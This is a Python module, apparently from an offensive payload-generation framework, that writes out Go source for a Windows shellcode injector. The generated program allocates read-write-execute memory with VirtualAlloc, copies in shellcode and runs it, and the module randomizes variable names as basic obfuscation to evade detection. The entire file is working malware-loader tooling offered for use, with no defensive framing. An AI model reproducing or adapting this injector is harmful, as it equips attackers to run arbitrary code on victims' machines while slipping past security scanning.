"""

Go inline shellcode injector using the VirtualAlloc().
Uses basic variable renaming obfuscation.


Module built by @b00stfr3ak44

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:

    def __init__(self):
        # required
        self.language = "Go"
        self.extension = "go"
        self.rating = "Normal"
        self.description = "Go VirtualAlloc method for inline shellcode injection"
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"]
                                }

        self.shellcode = shellcode.Shellcode()

    def generate(self):
        Shellcode = self.shellcode.generate(self.required_options)
        # randomly generate out variable names
        memCommit = helpers.randomString()
        memReserve = helpers.randomString()
        pageExecRW = helpers.randomString()
        kernel32 = helpers.randomString()
        procVirtualAlloc = helpers.randomString()
        virtualAlloc = helpers.randomString()
        size = helpers.randomString()
        addr = helpers.randomString()
        err = helpers.randomString()
        sc = helpers.randomString()
        buff = helpers.randomString()
        value = helpers.randomString()

        payloadCode = "package main\nimport (\n\"fmt\"\n\"os\"\n\"unsafe\"\n\"syscall\"\n)\n"
        payloadCode += "const (\n"
        payloadCode += "%s  = 0x1000\n" %(memCommit)
        payloadCode += "%s = 0x2000\n" %(memReserve)
        payloadCode += "%s  = 0x40\n)\n" %(pageExecRW)
        payloadCode += "var (\n"
        payloadCode += "%s    = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
        payloadCode += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" %(procVirtualAlloc, kernel32)
        payloadCode += "func %s(%s uintptr) (uintptr, error) {\n" %(virtualAlloc, size)
        payloadCode += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
        payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
        payloadCode += "var %s string = \"%s\"\n" %(sc, Shellcode)
        payloadCode += "func main() {\n"
        payloadCode += "%s, %s := %s(uintptr(len(%s)))\n" %(addr, err, virtualAlloc, sc)
        payloadCode += "if %s != nil {\nfmt.Println(%s)\nos.Exit(1)\n}\n" %(err, err)
        payloadCode += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
        payloadCode += "for x, %s := range []byte(%s) {\n" %(value, sc)
        payloadCode += "%s[x] = %s\n}\n" %(buff, value)
        payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(addr)
        return payloadCode
